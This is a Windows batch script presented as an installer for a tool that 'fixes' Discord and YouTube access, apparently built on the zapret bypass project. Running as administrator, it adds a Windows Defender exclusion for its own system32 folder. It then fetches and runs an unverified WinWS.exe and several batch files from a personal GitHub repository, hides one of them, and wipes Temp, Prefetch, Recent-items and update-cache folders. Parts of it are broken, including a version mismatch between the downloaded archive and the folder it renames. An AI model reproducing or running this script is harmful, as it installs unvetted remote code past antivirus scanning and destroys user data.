@echo off > NUL 2> NUL
if "%1"=="admin" (echo Started with admin rights) else (echo Requesting admin rights... | powershell -Command "Start-Process 'cmd.exe' -ArgumentList '/c \"\"%~f0\" admin\"' -Verb RunAs" & exit /b)
attrib -h "%systemroot%\system32\Soldatik90\Fix\service.bat" | mode con: cols=15 lines=1 | COLOR 2
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '%systemroot%\system32\Soldatik90'" | reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" /v "%systemroot%\system32\Soldatik90\Update.BAT" /t REG_SZ /d "~ RUNASADMIN" /f | echo Set objShell = CreateObject("WScript.Shell") > %TEMP%\Soldatik90.vbs | echo Set objLink = objShell.CreateShortcut("%USERPROFILE%\Desktop\Main.lnk") >> %TEMP%\Soldatik90.vbs | echo objLink.Description = "Updates fix Discord and YouTube" >> %TEMP%\Soldatik90.vbs | echo objLink.TargetPath = "%systemroot%\system32\Soldatik90\fix\service.bat" >> %TEMP%\Soldatik90.vbs | echo objLink.iconLocation = "%systemroot%\system32\Soldatik90\Fix\bin\winws.exe" >> %TEMP%\Soldatik90.vbs | echo objLink.Save >> %TEMP%\Soldatik90.vbs  | cscript %TEMP%\Soldatik90.vbs  | %TEMP%\Soldatik90.vbs
del %TEMP%\Soldatik90.vbs
cls
taskkill /IM winws.exe /F
net stop "WinDivert"
sc delete "WinDivert"
net stop "WinDivert14"
sc delete "WinDivert"
net stop "WinDivert14"
sc delete "WinDivert14"
RMDIR /S /Q "%systemroot%\system32\Soldatik90\Fix"
RMDIR /S /Q "%systemroot%\system32\Soldatik90\Soft"
md "%systemroot%\system32\Soldatik90"
CD "%systemroot%\system32\Soldatik90"
powershell -executionpolicy bypass -command Invoke-WebRequest "https://raw.githubusercontent.com/Soldatik90x/Soldatik90/refs/heads/main/Main.bat" -o "Main.bat"
RMDIR /S /Q "%temp%" | RMDIR /S /Q "C:\Windows\Temp" | rmdir /S /Q "%userprofile%\AppData\Local\Temp" | RMDIR /S /Q "C:\Windows\Prefetch" | DEL /F /Q "%AppData%\Microsoft\Windows\Recent\" | RMDIR /S /Q "C:\Windows\SoftwareDistribution\Download" | MD "C:\Windows\SoftwareDistribution\Download" | del /F /Q %APPDATA%\Microsoft\Windows\Recent\AutomaticDestinations\*
Md "%systemroot%\system32\Soldatik90"
cd "%systemroot%\system32\Soldatik90"
powershell -executionpolicy bypass -command Invoke-WebRequest "https://github.com/Flowseal/zapret-discord-youtube/releases/download/1.10.2/zapret-discord-youtube-1.10.2.zip" -o "Soldatik90.zip"
powershell.exe -Nop -Nol -Command "Expand-Archive './Soldatik90.zip' './'
ren "zapret-discord-youtube-1.10.1" "Soft"
cls
cd "%systemroot%\system32\Soldatik90\Soft\bin"
powershell -executionpolicy bypass -command Invoke-WebRequest "https://github.com/Soldatik90x/Soldatik90/raw/refs/heads/main/WinWS.exe" -o "WinWS.exe"
MD "%systemroot%\system32\Soldatik90\Fix"
MD "%systemroot%\system32\Soldatik90\Fix\bin"
MD "%systemroot%\system32\Soldatik90\Fix\lists"
MD "%systemroot%\system32\Soldatik90\Fix\utils"
COPY "%systemroot%\system32\Soldatik90\Soft\bin" "%systemroot%\system32\Soldatik90\Fix\bin"
COPY "%systemroot%\system32\Soldatik90\Soft\lists" "%systemroot%\system32\Soldatik90\Fix\lists"
COPY "%systemroot%\system32\Soldatik90\Soft\utils" "%systemroot%\system32\Soldatik90\Fix\utils"
COPY "%systemroot%\system32\Soldatik90\soft\general (ALT10).bat" "%systemroot%\system32\Soldatik90\Fix\Soldatik90.bat"
cd "%systemroot%\system32\Soldatik90\soft"
powershell -executionpolicy bypass -command Invoke-WebRequest "https://github.com/Soldatik90x/Soldatik90/raw/refs/heads/main/service.bat" -o "Service.bat"
COPY "%systemroot%\system32\Soldatik90\soft\service.bat" "%systemroot%\system32\Soldatik90\Fix\service.bat"
cd "%systemroot%\system32\Soldatik90"
powershell -executionpolicy bypass -command Invoke-WebRequest "https://github.com/Soldatik90x/Soldatik90/raw/refs/heads/main/Update.BAT" -o "Update.BAT"
ECHO googleusercontent.com>>"%systemroot%\system32\Soldatik90\Fix\lists\list-general.txt"
ECHO steampowered.com>>"%systemroot%\system32\Soldatik90\Fix\lists\list-general.txt"
attrib +h "%systemroot%\system32\Soldatik90\Fix\service.bat"
DEL /S /Q "%systemroot%\system32\Soldatik90\soldatik90.zip" 
RMDIR /S /Q "%systemroot%\system32\Soldatik90\Soft"
copy "%systemroot%\system32\Soldatik90\Fix\service.bat" "%systemroot%\system32\Soldatik90\service.bat"
call "%systemroot%\system32\Soldatik90\Fix\service.bat" 
